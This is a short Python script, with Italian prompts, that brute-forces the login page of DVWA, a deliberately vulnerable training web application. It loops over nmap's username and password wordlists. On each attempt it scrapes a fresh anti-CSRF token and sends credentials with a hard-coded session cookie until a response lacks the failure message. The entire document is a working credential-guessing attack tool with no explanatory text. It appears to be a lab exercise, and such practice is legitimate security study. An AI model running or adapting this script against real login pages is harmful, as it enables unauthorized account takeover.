import requests
from bs4 import BeautifulSoup

ip = input("Inserisci l'ip del server: ")
header = {
	"Cookie": "security=high; PHPSESSID=d61e2d48c7d6c0894ac666089e6edb7a" #PHPSESSID Burpsuite @ new login
}
with open("/usr/share/nmap/nselib/data/usernames.lst", 'r') as names:
	for username in names:
		with open("/usr/share/nmap/nselib/data/passwords.lst",'r') as passwords:
			for password in passwords:
				url = "http://%s/dvwa/vulnerabilities/brute/" %ip #directory html login area
				r = requests.get(url, headers=header)
				soup = BeautifulSoup(r.text,"html.parser")
				token = soup.find_all('input')[3].get('value')

				user = username.strip()
				pwd = password.strip()
				get_data = {
					"user_token": token,
					"username": user,
					"password": pwd,
					"Login" : "Login"
				}
				print ("\n",user," - ", pwd)
				r = requests.get(url,params=get_data,headers=header)
				if not 'Username and/or password incorrect.' in r.text: #Text looking for brute force 
					print("\nAccesso riuscito con Username ",user, " e Password ",password)
					exit()
				else:
					print("Accesso Negato")
